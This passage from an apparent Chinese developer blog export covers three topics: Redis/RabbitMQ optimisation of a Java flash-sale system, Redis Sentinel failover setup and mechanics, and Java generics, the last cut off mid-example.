在MiaoshaService中的Miaosha方法：数据库减库存失败的话，说明数据库的库存已经小于0了，那么这个时候，立即将redis初始设置的秒杀商品是否卖完的状态为true，表示商品已经全部卖完，返回秒杀失败。否则就是要前端等待等待。 1234567891011@Transactionalpublic OrderInfo miaosha(MiaoshaUser user, GoodsVo goods) &#123; //减库存、下订单、写入秒杀订单 boolean success =goodsService.reduceStock(goods); if(success)&#123; return orderService.createOrder(user,goods); &#125;else&#123; setGoodsOver(goods.getId()); return null; &#125;&#125; 对于两个小方法getGoodsOver和setGoodsOver： 1234567private void setGoodsOver(long goodId)&#123; redisService.set(MiaoshaKey.isGoodsOver,""+goodId,true);&#125;private boolean getGoodsOver(long goodsId) &#123; return redisService.exists(MiaoshaKey.isGoodsOver,""+goodsId);&#125; 那么redis预减库存，然后消息队列来进行创建订单就实现了。 当然，对于redis预减库存这一点，还有要优化的地方，就是现在的do_miaosha接口是这样的：12345678910111213141516171819202122232425262728@RequestMapping(value = "/do_miaosha",method = RequestMethod.POST)@ResponseBodypublic Result&lt;Integer&gt; do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); //1.预减库存进行优化 /*********************************优化1开始*************************************/ long stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,""+goodsId); if(stock &lt; 0)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; /*********************************优化1结束*************************************/ //2.判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; return Result.error(CodeMsg.REPEATE_MIAOSHA); &#125; /*********************************优化2开始*************************************/ //3.进入消息队列 MiaoshaMessage message = new MiaoshaMessage(); message.setUser(user); message.setGoodsId(goodsId); sender.sendMiaoshaMessage(message); /*********************************优化2结束*************************************/ return Result.success(0);//排队中&#125; 但是，当秒杀商品已经没得时候，就没有必要再去redis中进行判断了，毕竟查询redis也是需要网络开销的，解决思路是：在内存中进行判断，如果redisService.decr得到的stock少于零的时候，直接将内存中的一个标志改变一下，那么下次再进入do_miaosha接口，先判断内存这个标记，如果库存已经小于0了，就不再访问redis，而是直接返回秒杀商品已经卖完。 123456789101112131415161718192021222324252627282930313233@RequestMapping(value = "/do_miaosha",method = RequestMethod.POST)@ResponseBodypublic Result&lt;Integer&gt; do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); /***************************对redis预减库存再优化*************************** //内存标记，减少不必要的redis的访问 boolean over = localOverMap.get(goodsId); if(over)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; *******************************************************************/ //预减库存进行优化 long stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,""+goodsId); if(stock &lt; 0)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; //判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; localOverMap.put(goodsId,true); return Result.error(CodeMsg.REPEATE_MIAOSHA); &#125; //进入消息队列 MiaoshaMessage message = new MiaoshaMessage(); message.setUser(user); message.setGoodsId(goodsId); sender.sendMiaoshaMessage(message); return Result.success(0);//排队中&#125; 声明一个map： 1private Map&lt;Long,Boolean&gt; localOverMap = new HashMap&lt;&gt;(); 那么在afterPropertiesSet这个系统加载的初始化方法中对这个map进行初始化，goodsId--stock： 1localOverMap.put(goods.getId(),false); 在原来的redis预减库存初，发现库存小于0 ，就改为true: 1234if(stock &lt; 0)&#123; localOverMap.put(goodsId,true); return Result.error(CodeMsg.MIAO_SHA_OVER);&#125; 最后do_miaosha接口变为： 12345678910111213141516171819202122232425262728293031@RequestMapping(value = "/do_miaosha",method = RequestMethod.POST)@ResponseBodypublic Result&lt;Integer&gt; do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); //内存标记，减少不必要的redis的访问 boolean over = localOverMap.get(goodsId); if(over)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; //预减库存进行优化 long stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,""+goodsId); if(stock &lt; 0)&#123; localOverMap.put(goodsId,true); return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; //判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; return Result.error(CodeMsg.REPEATE_MIAOSHA); &#125; //进入消息队列 MiaoshaMessage message = new MiaoshaMessage(); message.setUser(user); message.setGoodsId(goodsId); sender.sendMiaoshaMessage(message); return Result.success(0);//排队中&#125; ok，整个关于redis预减库存和rabbitMQ创建订单这个优化已经基本完成了。]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.redis sentinel实现高可用读写分离]]></title>
    <url>%2F2018%2F07%2F21%2F6.redis%20sentinel%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[介绍redis sentinel实现高可用读写分离。 1. redis sentinel 故障转移的基本原理： 多个sentinel发现并确认master有问题 选举出一个sentinel作为领导 选出一个可以成为新的master的slave 通知其他的slave称为新的master的slave 通知客户端主从变化 等待老的master复活称为新的master的slave 也支持多个master-slave结构： 2. 安装与配置 配置开启主从节点 配置开启sentinel监控主节点（sentinel是特殊的redis） 实际应该多台机器，但是演示方便，只用一台机器来搭建 详细配置节点 本地安装的结构图： 对于master:redis-7000.conf配置： 12345port 7000daemonize yespidfile /usr/local/redis/data/redis-7000.pidlogfile &quot;7000.log&quot;dir &quot;/usr/local/redis/data&quot; 对于slave:redis-7001和redis-7002配置： 123456port 7001daemonize yespidfile /usr/local/redis/data/redis-7001.pidlogfile &quot;7001.log&quot;dir &quot;/usr/local/redis/data&quot;slaveof 127.0.0.1 7000 启动redis服务： 1redis-server ../config/redis-7000.conf 访问7000端口的master redis: 1redis-cli -p 7000 info replication 显示他有两个从节点： 12345678910# Replicationrole:masterconnected_slaves:2slave0:ip=127.0.0.1,port=7002,state=online,offset=99550,lag=1slave1:ip=127.0.0.1,port=7001,state=online,offset=99816,lag=0master_repl_offset:99816repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:99815 对于sentinel主要配置： master sentinel config:123456port 26379daemonize yesdir &quot;/usr/local/redis/data&quot;logfile &quot;26379.log&quot;sentinel monitor mymaster 127.0.0.1 7000 2... 启动redis sentinel: 1redis-sentinel ../config/redis-sentinel-26379.conf 访问26379 redis sentinel master: 1redis-cli -p 26379 info sentinel 显示： 123456# Sentinelsentinel_masters:1sentinel_tilt:0sentinel_running_scripts:0sentinel_scripts_queue_length:0master0:name=mymaster,status=ok,address=127.0.0.1:7000,slaves=2,sentinels=3 1查看这六个进程是否都起来了：ps -ef | grep redis 注意，如果上面是配置在虚拟机的话，需要将127.0.0.1改为虚拟机的ip，要不然找不着。 3. 故障转移演练3.1 java客户端程序JedisSentinelPool只是一个配置中心，不需要具体连接某个redis，注意它不是代理。 1234567891011121314151617181920212223242526272829303132333435private Logger logger = LoggerFactory.getLogger(AppTest.class);@Testpublic void test4()&#123; //哨兵配置，我们访问redis，就通过sentinel来访问 String masername = "mymaster"; Set&lt;String&gt; sentinels = new HashSet&lt;&gt;(); sentinels.add("10.128.24.176:26379"); sentinels.add("10.128.24.176:26380"); sentinels.add("10.128.24.176:26381"); JedisSentinelPool sentinelPool = new JedisSentinelPool(masername,sentinels); //一个while死循环，每隔一秒往master塞入一个值，并且日志打印 while (true)&#123; Jedis jedis = null; try&#123; jedis = sentinelPool.getResource(); int index = new Random().nextInt(100000); String key = "k-" + index; String value = "v-" + index; jedis.set(key,value); logger.info("&#123;&#125; value is &#123;&#125;",key,jedis.get(key)); TimeUnit.MILLISECONDS.sleep(1000); &#125;catch (Exception e)&#123; logger.error(e.getMessage(),e); &#125;finally &#123; if(jedis != null)&#123; jedis.close(); &#125; &#125; &#125;&#125; maven依赖是： 123456789101112131415161718&lt;!--jedis--&gt;&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt;&lt;/dependency&gt;&lt;!--slf4j日志接口--&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.6&lt;/version&gt;&lt;/dependency&gt;&lt;!--logback日志实现--&gt;&lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;1.1.1&lt;/version&gt;&lt;/dependency&gt; 启动程序，发现是正常写入： 123456789101112131416:16:01.424 [main] INFO com.njupt.swg.AppTest - k-54795 value is v-5479516:16:02.426 [main] INFO com.njupt.swg.AppTest - k-55630 value is v-5563016:16:03.429 [main] INFO com.njupt.swg.AppTest - k-70642 value is v-7064216:16:04.430 [main] INFO com.njupt.swg.AppTest - k-42978 value is v-4297816:16:05.431 [main] INFO com.njupt.swg.AppTest - k-96297 value is v-9629716:16:06.433 [main] INFO com.njupt.swg.AppTest - k-4220 value is v-422016:16:07.435 [main] INFO com.njupt.swg.AppTest - k-34103 value is v-3410316:16:08.436 [main] INFO com.njupt.swg.AppTest - k-9177 value is v-917716:16:09.437 [main] INFO com.njupt.swg.AppTest - k-24389 value is v-2438916:16:10.439 [main] INFO com.njupt.swg.AppTest - k-32325 value is v-3232516:16:11.440 [main] INFO com.njupt.swg.AppTest - k-68538 value is v-6853816:16:12.441 [main] INFO com.njupt.swg.AppTest - k-36233 value is v-3623316:16:13.443 [main] INFO com.njupt.swg.AppTest - k-305 value is v-30516:16:14.444 [main] INFO com.njupt.swg.AppTest - k-59279 value is v-59279 我们将现在的端口为7000的redis master 给kill掉 kill -9 master的pid 我们会发现：客户端报异常，但是在大概十几秒之后，就继续正常塞值了。原因是服务端的哨兵机制的选举matser需要一定的时间。 4. 三个定时任务4.1 每10秒每个sentinel对master和slave执行Info 发现slave节点 确认主从关系 4.2 每2秒每个sentinel通过master节点的channel交换信息(pub/sub) 通过__sentinel__:hello进行频道交互 交互对节点的“看法”和自身信息 4.3 每1秒每个sentinel对其他sentinel和redis执行ping 心跳监测，失败判定依据 5. 主观下线和客观下线对于之前的Sentinel配置文件中有两条配置： 监控master redis节点，这里是当超过两个sentinel认为master挂了，则认为master挂了。 sentinel monitor &lt;masterName&gt; &lt;masterIp&gt; &lt;msterPort&gt; &lt;quorum&gt; sentinel monitor mymaster 127.0.0.1 6379 2 这里是每秒sentinel都会去Ping周围的master redis，超过30秒没有任何相应，说明其挂了。 sentinel down-after-milliseconds &lt;masterName&gt; &lt;timeout&gt; sentinel down-after-milliseconds mymaster 300000 5.1 主观下线主观下线：每个sentinel节点对Redis节点失败的“偏见” 这是一种主观下线。因为在复杂的网络环境下，这个sentinel与这个master不通，但是master与其他的sentinel都是通的呢？所以是一种“偏见” 这是依靠的第三种定时：每秒去ping一下周围的sentinel和redis。对于slave redis,可以使用这个主观下线，因为他不需要进行故障转移。 5.2 客观下线客观下线：所有sentinel节点对master Redis节点失败“达成共识”（超过quorum个则统一） 这是依靠的第二种定时：每两秒，sentinel之间进行“商量”，传递的消息是:sentinel is-master-down-by-addr 对于master redis的下线，必须要达成共识才可以，因为涉及故障转移，仅仅依靠一个sentinel判断是不够的。 6. 领导者选举原因：只有一个sentinel节点完成故障转移 选举：通过sentinel is-master-down-by-addr命令都希望成为领导者 每个做主观下线的sentinel节点向其他sentinel节点发送命令，要求将它设置为领导者 收到命令的sentinel节点如果还没有同意过其他semtinel节点发送的命令，那么将同意该请求，否则拒绝 如果该sentinel节点发现自己的票数已经超过sentinel集合半数并且超过quorum，那么它将成为领导者。 如果此过程中多个sentinel节点成为了领导者，那么将等待一段时间重新进行选举 7. 故障转移 从slave节点中选出一个“合适的”节点作为新的master节点 对上述的slave节点执行“slaveof no one”命令使其成为master节点 向剩余的slave节点发送命令，让它们成为新master节点的slave节点，复制规则和parallel-syncs参数一样 更新对原来的master节点配置为slave，并保持着对其“关注”，当恢复后命令他去复制新的master节点 那么，如何选择“合适”的slave节点呢？ 选择slave-priority(slave节点优先级)最高的slave节点，如果存在则返回，不存在则继续。 选择复制偏移量最大的slave节点(复制得最完整)，如果存在则返回，不存在则继续 选择run_id最小的slave节点(最早的节点) 8. 节点下线主节点下线：sentinel failover &lt;masterName&gt; 从节点下线要注意读写分离问题。 9. 总结与思考 redis sentinel是redis高可用实现方案：故障发现、故障自动转移、配置中心、客户端通知。 redis sentinel从redis2.8版本才正式生产可用，之前版本不可生产用。 尽可能在不同物理机上部署redis sentinel所有节点。 redis sentinel中的sentinel节点个数应该大于等于3且最好是奇数。 redis sentinel中的数据节点和普通数据节点没有区别。每个sentinel节点在本质上还是一个redis实例，只不过和redis数据节点不同的是，其主要作用是监控redis数据节点 客户端初始化时连接的是sentinel节点集合，不再是具体的redis节点，但sentinel只是配置中心不是代理。 redis sentinel通过三个定时任务实现了sentinel节点对于主节点、从节点、其余sentinel节点的监控。 redis sentinel在对节点做失败判定时分为主观下线和客观下线。 看懂redis sentinel故障转移日志对于redis sentinel以及问题排查非常有用。 redis sentinel实现读写分离高可用可以依赖sentinel节点的消息通知，获取redis数据节点的状态变化。 redis sentinel可以实现高可用的读写分离，高可用体现在故障转移，那么实现高可用的基础就是要有从节点，主从节点还实现了读写分离，减少master的压力。但是如果是从节点下线了，sentinel是不会对其进行故障转移的，并且连接从节点的客户端也无法获取到新的可用从节点，而这些问题在Cluster中都得到了有效的解决。 对于性能提高、容量扩展的时候，这种方式是比较复杂的，比较推荐的是使用集群，就是下面讨论的redis cluster!]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.java泛型]]></title>
    <url>%2F2018%2F07%2F21%2F6.java%E6%B3%9B%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[本篇文章全面介绍Java泛型中的基础及原理。 1. 什么是泛型以及为什么用泛型 泛型，即“参数化类型”。 一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？ 顾名思义，就是将类型由原来的具体的类型参数化。是指所操作的数据类型在定义是被指定为一个参数，然后在使用时传入具体的类型。 12345678List arrayList = new ArrayList();arrayList.add("aaaa");arrayList.add(100);for(int i = 0; i&lt; arrayList.size();i++)&#123; String item = (String)arrayList.get(i); Log.d("泛型测试","item = " + item);&#125; 毫无疑问，程序的运行结果会以崩溃结束： 1java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String 为什么会出现这种问题呢？ 集合本身无法对其存放的对象类型进行限定，可以涵盖Java中的所有类型。缺口太大，导致各种蛇、蚁、虫、鼠通通都可以进来。 由于我们要使用的实际存放类型的方法，所以不可避免地要进行类型转换。小对象转大对象很容易，大对象转小对象则有很大的风险，因为在编译时，我们无从得知对象真正的类型。 泛型就是为了解决这类问题而诞生的。 2. 泛型的特性此部分是泛型进阶的部分，看的费劲的话可以放在最后看。 泛型只在编译阶段有效12345678910111213public class Main5 &#123; public static void main(String[] args) &#123; List&lt;String&gt; stringArrayList = new ArrayList&lt;String&gt;(); List&lt;Integer&gt; integerArrayList = new ArrayList&lt;Integer&gt;(); Class classStringArrayList = stringArrayList.getClass(); Class classIntegerArrayList = integerArrayList.getClass(); if(classStringArrayList.equals(classIntegerArrayList))&#123; System.out.println("类型相同"); &#125; &#125;&#125; 输出结果：类型相同 通过上面的例子可以证明，在编译之后程序会采取去泛型化的措施。也就是说Java中的泛型，只在编译阶段有效。在编译过程中，正确检验泛型结果后，会将泛型的相关信息擦除，并且在对象进入和离开方法的边界处添加类型检查和类型转换的方法。也就是说，泛型信息不会进入到运行时阶段。 对此总结成一句话：泛型类型在逻辑上可以看成是多个不同的类型，实际上都是相同的基本类型。 泛型的兼容性首先要强调的是，泛型是编译时才会检查合法性，编译后会直接擦除泛型信息。正由于这一点，所以在使用Eclipse编写源代码时，如果代码不合法，它会直接提示我们。Java编译器是向后兼容的，也就是低版本的源代码可以用高版本编译器进行编译。下面来看看那些兼容性代码。 引用和实例化都不包含泛型信息。 123456789public class Compatibility &#123; public static void main(String[] args) &#123; // 下面编译通过 List list1 = new ArrayList(); list1.add("123"); list1.add(1); &#125;&#125; 上面的这段代码是可以通过编译的，这是JDK1.4之前的写法，所以可以验证JDK1.5之后的编译器是可以兼容JDK1.4之前的源代码的。不过，笔者在JDK1.8.x版本的编译器进行编译时，会抛出如下所示的警告信息。很显然，如果类被定义成泛型类，但是在实际使用时不使用泛型特性，这是不推荐的做法！ 12注: Compatibility.java使用了未经检查或不安全的操作。注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。 引用使用泛型，实例化不使用泛型。 123456789public class Compatibility &#123; public static void main(String[] args) &#123; // 编译不通过 List&lt;String&gt; list2 = new ArrayList(); list2.add("123"); list2.add(1); // 这里出错 &#125;&#125; 上面的代码编译不通过，由于对引用使用了泛型，其中的所能容纳的对象必须为String 类型。这种写法实际上跟完整写法的作用一致，不过Eclipse仍然会警告。 引用不使用泛型，实例化使用泛型。 12345678public class Compatibility &#123; public static void main(String[] args) &#123; // 编译通过 List list3 = new ArrayList&lt;String&gt;(); list3.add("123"); list3.add(1); &#125;&#125; 上面的这段代码可以编译通过，其效果与1（不使用泛型）完全一致。结合2、3可以知道，编译时只能做引用的类型检查，而无法检查引用所指向对象的实际类型。 泛型与继承在使用泛型时，引用的参数类型与实际对象的参数类型要保持一致（通配符除外），就算两个参数类型是继承关系也是不允许的。看看下面的2行代码，它们均不能通过编译。 12ArrayList&lt;String&gt; arrayList1 = new ArrayList&lt;Object&gt;(); //编译错误 ArrayList&lt;Object&gt; arrayList1 = new ArrayList&lt;String&gt;(); //编译错误 下面来探讨一下为什么不能这么做。 第1种情况，如果这种代码可以通过编译，那么调用get()方法返回的对象应该是String，但它实际上可以存放任意Object类型的对象，这样在调用类型转换指令时会抛出ClassCastException。 第2种情况。虽然String类型的对象转换为Object不会有任何问题，但是这有什么意义呢？我们原本想要用String对象的方法，但最终将其赋予了一个Object类型的引用。如果需要使用String中的某些方法，必须将Object强制转换为String。这样不会抛出异常，但是却违背了泛型设计的初衷。 泛型与多态下面来考虑一下泛型中多态问题。普通类型的多态是通过继承并重写父类的方法来实现的，泛型也不例外，下面是一个泛型多态示例。 123456789public class Father&lt;T&gt; &#123; public void set(T t) &#123; System.out.println("I am father, t=" + t); &#125; public T get() &#123; return null; &#125;&#125; 12345678910111213141516public class Son extends Father&lt;String&gt; &#123; @Override public void set(String t) &#123; super.set(t); System.out.println("I am son."); &#125; @Override public String get() &#123; return super.get(); &#125; public static void main(String[] args) &#123; Father&lt;String&gt; father = new Son(); father.set("hello world"); &#125;&#125; 上面定义了一个泛型父类和一个实际参数为String类型的子类，并“重写”了set(T)和get()方法。Son类中的@Override注解也清楚地显示这是一个重写方法，最终执行的结果如下，与想象中的结果完全一致。 12I am father, t=hello worldI am son. 真的这么简单么？虽然表面上（源代码层面）来看，泛型多态与普通类的多态并无二样，但是其内部的实时原理却大相径庭。 泛型类Father在编译后会擦除泛型信息，所有的泛型参数都会用Object类替代。实际上，Father编译后的字节码与下面的代码完全一致。 123456789public class Father &#123; public void set(Object t) &#123; System.out.println("I am father, t=" + t); &#125; public Object get() &#123; return null; &#125;&#125; Son类的与最终会变为： 12345678910111213141516public class Son extends Father &#123; @Override public void set(String t) &#123; super.set(t); System.out.println("I am son."); &#125; @Override public String get() &#123; return super.get(); &#125; public static void main(String[] args) &#123; Father father = new Son(); father.set("hello world"); &#125;&#125; Father和Son类的set()方法的参数类型不一样，所以，这并不是方法重写，而是方法重载！但是，如果是重载，那么Son类就应该会继承Father类的set(Object)方法，也就是Son会同时包含set(String)和set(Object)，下面来测试一下。 123Son son = new Son();son.set("test");son.set(new Object()); // 编译错误 当set一个Object对象时，编译无法通过。这就很奇怪了，感觉跟之前学到的知识是相悖的。我们原本想通过重写方法来实现多态，但由于泛型的类型擦除，却最终变成了重载，所以类型擦除与多态有了矛盾。那么Java是怎么解决这个问题的呢？还是从字节码中找答案吧。Son类最终的编译结果如下： 1234567public void set(java.lang.String); // 我们重写的方法public java.lang.String get(); // 我们重写的方法public java.lang.Object get(); // 编译器生成的方法public void set(java.lang.Object); // 编译器生成的方法 ... 2: checkcast #39 // class java/lang/String ... 这里面多了一个Object get()方法和set(Object)方法，这两个方法在Son类源代码里面并不存在，这是编译器为了解决泛型的多态问题而自动生成的方法，称为“桥方法”。这两个方法的签名与Father类中的两个方法的签名完全一致，这才是真正的方法重写。也就是说，子类真正重写的我们看不到的桥方法，啊，多么痛的领悟！！！@Override注解只是假象，让人误以为他们真的是重写方法。 再看看set(Object)桥方法的实现细节，先将Object对象强制转换为String对象，然后调用Son中的set(String)方法。绕了一个圈，最终才回到我们“重写”的方法。main方法中原本调用父类的set(Object)方法，由于子类通过桥方法重写了这个方法，所以最终的调用顺序是：set(Object) -&gt; set(String)。 与set(Object)桥方法的意义不同，Object get()并不仅仅解决泛型与重写的冲突，而更具有一般性。看看下面的代码，这是一个普通类的继承: 12345public class GeneralFather &#123; public Object get() &#123; return null; &#125;&#125; 123456public class GeneralSon extends GeneralFather &#123; @Override public String get() &#123; return ""; &#125;&#125; 子类的返回类型是父类的返回类型的子类，这是允许的，这种特性叫做Java返回值的协变性。而协变性的实现方法就是上面所述的桥方法。 这里还会有疑惑，set方法可以通过参数类型来确定调用的方法。但是，参数一样而返回值不一样是不能重载的。如果我们在源代码中通过编写String get()和Object get()方法是无法通过编译的。虽然，编译器无法通过编译，但是JVM是可以编写这两种方法的，它调用方法时，将返回值也作为方法签名的一部分。有种只许州官放火，不许百姓点灯的感觉。可以看到，JVM做了不少我们认为不合法的事情，所以如果不深入研究底层原理，有些问题根本解释不了。 3. 泛型的使用泛型有三种使用方式，分别为：泛型类、泛型接口、泛型方法. 3.1 泛型类泛型类型用于类的定义中，被称为泛型类。通过泛型可以完成对一组类的操作对外开放相同的接口。最典型的就是各种容器类，如：List、Set、Map。 1234567891011121314//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型//在实例化泛型类时，必须指定T的具体类型public class Generic&lt;T&gt;&#123; //key这个成员变量的类型为T,T的类型由外部指定 private T key; public Generic(T key) &#123; //泛型构造方法形参key的类型也为T，T的类型由外部指定 this.key = key; &#125; public T getKey()&#123; //泛型方法getKey的返回值类型为T，T的类型由外部指定 return key; &#125;&#125; 下面进行实例化： 123456789//泛型的类型参数只能是类类型（包括自定义类），不能是简单类型//传入的实参类型需与泛型的类型参数类型相同，即为Integer.Generic&lt;Integer&gt; genericInteger = new Generic&lt;Integer&gt;(123456);//传入的实参类型需与泛型的类型参数类型相同，即为String.Generic&lt;String&gt; genericString = new Generic&lt;String&gt;("key_vlaue");Log.d("泛型测试","key is " + genericInteger.getKey());Log.d("泛型测试","key is " + genericString.getKey()); 1212-27 09:20:04.432 13063-13063/? D/泛型测试: key is 12345612-27 09:20:04.432 13063-13063/? D/泛型测试: key is key_vlaue 定义的泛型类，就一定要传入泛型类型实参么？并不是这样，在使用泛型的时候如果传入泛型实参，则会根据传入的泛型实参做相应的限制，此时泛型才会起到本应起到的限制作用。如果不传入泛型类型实参的话，在泛型类中使用泛型的方法或成员变量定义的类型可以为任何的类型。 123456789Generic generic = new Generic("111111");Generic generic1 = new Generic(4444);Generic generic2 = new Generic(55.55);Generic generic3 = new Generic(false);Log.d("泛型测试","key is " + generic.getKey());Log.d("泛型测试","key is " + generic1.getKey());Log.d("泛型测试","key is " + generic2.getKey());Log.d("泛型测试","key is " + generic3.getKey()); 1234D/泛型测试: key is 111111D/泛型测试: key is 4444D/泛型测试: key is 55.55D/泛型测试: key is false 3.2 泛型接口1234//定义一个泛型接口public interface Generator&lt;T&gt; &#123; public T next();&#125; 当实现泛型接口的类，未传入泛型实参时：1234567891011/** * 未传入泛型实参时，与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中 * 即：class FruitGenerator&lt;T&gt; implements Generator&lt;T&gt;&#123; * 如果不声明泛型，如：class FruitGenerator implements Generator&lt;T&gt;，编译器会报错："Unknown class" */class FruitGenerator&lt;T&gt; implements Generator&lt;T&gt;&#123; @Override public T next() &#123; return null; &#125;&#125; 当实现泛型接口的类，传入泛型实参时：1234567891011121314151617/** * 传入泛型实参时： * 定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口Generator&lt;T&gt; * 但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。 * 在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型 * 即：Generator&lt;T&gt;，public T next();中的的T都要替换成传入的String类型。 */public class FruitGenerator implements Generator&lt;String&gt; &#123; private String[] fruits = new String[]&#123;"Apple", "Banana", "Pear"&#125;; @Override public String next() &#123; Random rand = new Random(); return fruits[rand.nextInt(3)]; &#125;&#125; 3.3 泛型通配符我们知道Ingeter是Number的一个子类，同时我们也验证过Generic&lt;Ingeter&gt;与Generic&lt;Number&gt;实际上是相同的一种基本类型。那么问题来了，在使用Generic&lt;Number&gt;作为形参的方法中，能否使用Generic&lt;Ingeter&gt;的实例传入呢？在逻辑上类似于Generic&lt;Number&gt;和Generic&lt;Ingeter&gt;是否可以看成具有父子关系的泛型类型呢？ 为了弄清楚这个问题，我们使用Generic&lt;T&gt;这个泛型类继续看下面的例子： 123public void showKeyValue1(Generic&lt;Number&gt; obj)&#123; Log.d("泛型测试","key value is " + obj.getKey());&#125; 12345678Generic&lt;Integer&gt; gInteger = new Generic&lt;Integer&gt;(123);Generic&lt;Number&gt; gNumber = new Generic&lt;Number&gt;(456);showKeyValue(gNumber);// showKeyValue这个方法编译器会为我们报错：Generic&lt;java.lang.Integer&gt; // cannot be applied to Generic&lt;java.lang.Number&gt;// showKeyValue(gInteger); 通过提示信息我们可以看到Generic&lt;Integer&gt;不能被看作为Generic&lt;Number&gt;的子类。由此可以看出:同一种泛型可以对应多个版本（因为参数类型是不确定的），不同版本的泛型类实例是不兼容的。 回到上面的例子，如何解决上面的问题？总不能为了定义一个新的方法来处理Generic&lt;Integer&gt;类型的类，这显然与java中的多态理念相违背。因此我们需要一个在逻辑上可以表示同时是Generic&lt;Integer&gt;和Generic&lt;Number&gt;父类的引用类型。由此类型通配符应运而生。 我们可以将上面的方法改一下： 123public void showKeyValue1(Generic&lt;?&gt; obj)&#123; Log.d("泛型测试","key value is " + obj.getKey());&#125; 类型通配符一般是使用&#39;?&#39;代替具体的类型实参，注意，此处’?’是类型实参，而不是类型形参 。重要说三遍！此处&#39;?&#39;是类型实参，而不是类型形参 ！ 此处&#39;?&#39;是类型实参，而不是类型形参 ！再直白点的意思就是，此处的&#39;?&#39;和Number、String、Integer一样都是一种实际的类型，可以把&#39;?&#39;看成所有类型的父类。是一种真实的类型。 可以解决当具体类型不确定的时候，这个通配符就是&#39;?&#39;；当操作类型时，不需要使用类型的具体功能时，只使用Object类中的功能。那么可以用&#39;?&#39;通配符来表示未知类型。 3.4 泛型方法泛型类，是在实例化类的时候指明泛型的具体类型；泛型方法，是在调用方法的时候指明泛型的具体类型 。 123456789101112131415/** * 泛型方法的基本介绍 * @param tClass 传入的泛型实参 * @return T 返回值为T类型 * 说明： * 1）public 与 返回值中间&lt;T&gt;非常重要，可以理解为声明此方法为泛型方法。 * 2）只有声明了&lt;T&gt;的方法才是泛型方法，泛型类中的使用了泛型的成员方法并不是泛型方法。 * 3）&lt;T&gt;表明该方法将使用泛型类型T，此时才可以在方法中使用泛型类型T。 * 4）与泛型类的定义一样，此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型。 */public &lt;T&gt; T genericMethod(Class&lt;T&gt; tClass)throws InstantiationException , IllegalAccessException&#123; T instance = tClass.newInstance(); return instance;&#125; 1Object obj = genericMethod(Class.forName("com.test.test")); 在对泛型方法进行一个比较，加深理解： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394public class GenericTest &#123; //这个类是个泛型类，在上面已经介绍过 public class Generic&lt;T&gt;&#123; private T key; public Generic(T key) &#123; this.key = key; &#125; //我想说的其实是这个，虽然在方法中使用了泛型，但是这并不是一个泛型方法。 //这只是类中一个普通的成员方法，只不过他的返回值是在声明泛型类已经声明过的泛型。 //所以在这个方法中才可以继续使用 T 这个泛型。 public T getKey()&#123; return key; &#125; /** * 这个方法显然是有问题的，在编译器会给我们提示这样的错误信息"cannot reslove symbol E" * 因为在类的声明中并未声明泛型E，所以在使用E做形参和返回值类型时，编译器会无法识别。 public E setKey(E key)&#123; this.key = key； &#125; */ //必须要声明E才行 public &lt;E&gt; E setKey(E key)&#123; this.key = (T)key; return key; &#125; &#125; /** * 这才是一个真正的泛型方法。 * 首先在public与返回值之间的&lt;T&gt;必不可少，这表明这是一个泛型方法，并且声明了一个泛型T * 这个T可以出现在这个泛型方法的任意位置. * 泛型的数量也可以为任意多个 * 如：public &lt;T,K&gt; K showKeyName(Generic&lt;T&gt; container)&#123; * ... * &#125; */ public &lt;T&gt; T showKeyName(Generic&lt;T&gt; container)&#123; System.out.println("container key :" + container.getKey()); //当然这个例子举的不太合适，只是为了说明泛型方法的特性。 T test = 